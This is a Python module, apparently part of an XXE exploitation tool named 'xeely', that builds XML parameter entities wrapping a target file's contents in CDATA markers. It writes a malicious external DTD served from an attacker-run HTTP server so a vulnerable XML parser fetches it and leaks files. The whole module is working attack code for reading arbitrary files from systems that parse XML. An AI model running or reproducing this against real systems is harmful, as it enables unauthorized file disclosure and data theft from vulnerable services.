import os
from typing import List
from typing import Sequence

from .doctype import write_doctype_content_to_disk
from xeely import RESOURCES_PATH
from xeely.custom_http.server import HTTPServerParams
from xeely.custom_xml import XMLEntity

CDATA_FILE_PATH = RESOURCES_PATH / "cdata.dtd"


CDATA_JOINED_ENTITY_NAME = "all"
CDATA_EXPLOIT_ENTITY_NAME = "joined"


def get_cdata_dtd_file_url(http_server_params: HTTPServerParams) -> str:
    return f"{http_server_params.get_base_url()}/{CDATA_FILE_PATH.name}"


def get_cdata_entities(file_entity_value) -> List[XMLEntity]:
    return [
        XMLEntity(_name="begin", _value="<![CDATA[", _is_parameter=True),
        XMLEntity(_name="file", _value=file_entity_value, _is_external=True, _is_parameter=True),
        XMLEntity(_name="end", _value="]]>", _is_parameter=True),
    ]


def get_cdata_doctype_entities(
    resource: str, http_server_params: HTTPServerParams
) -> Sequence[XMLEntity | str]:
    remote_entity_name = "remote"
    entities: Sequence[XMLEntity | str] = [
        *get_cdata_entities(resource),
        XMLEntity(
            _name=remote_entity_name,
            _value=get_cdata_dtd_file_url(http_server_params),
            _is_external=True,
            _is_parameter=True,
        ),
        f"%{remote_entity_name};",
    ]
    return entities


def create_cdata_dtd_file(is_parameter_entity: bool = False):
    entities = [
        XMLEntity(
            _name=CDATA_EXPLOIT_ENTITY_NAME,
            _value="%begin;%file;%end;",
            _is_parameter=is_parameter_entity,
        )
    ]
    write_doctype_content_to_disk(CDATA_FILE_PATH, entities)


def delete_cdata_dtd_file():
    os.remove(CDATA_FILE_PATH)
